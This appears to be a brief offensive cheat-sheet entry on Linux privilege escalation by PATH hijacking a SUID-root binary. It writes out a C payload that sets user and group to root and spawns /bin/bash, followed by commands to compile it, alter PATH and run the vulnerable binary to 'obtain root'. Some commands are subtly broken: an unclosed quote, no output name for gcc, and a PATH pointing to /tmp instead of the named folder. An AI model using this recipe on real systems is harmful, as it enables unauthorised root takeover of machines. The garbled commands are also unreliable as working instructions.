// this is contingent on a vulnerable binary in Linux with the Owner Permission SUID set to 'rws' 
// this allows for execution of said vulnerable binary as root
// create a simple C file for linux priv esc that opens binbash



echo 'int main () { setgid(0); setuid(0); system("/bin/bash"); return 0;} > /some_folder/some_file.c



// compile file: gcc /some_folder/some_file.c
// change the env variable of PATH to the folder of our malicious file /some_folder: export PATH=/tmp:$PATH
// run the path of the vulnerable binary: /usr/local/bin/vulnerable_bin
// obtain root
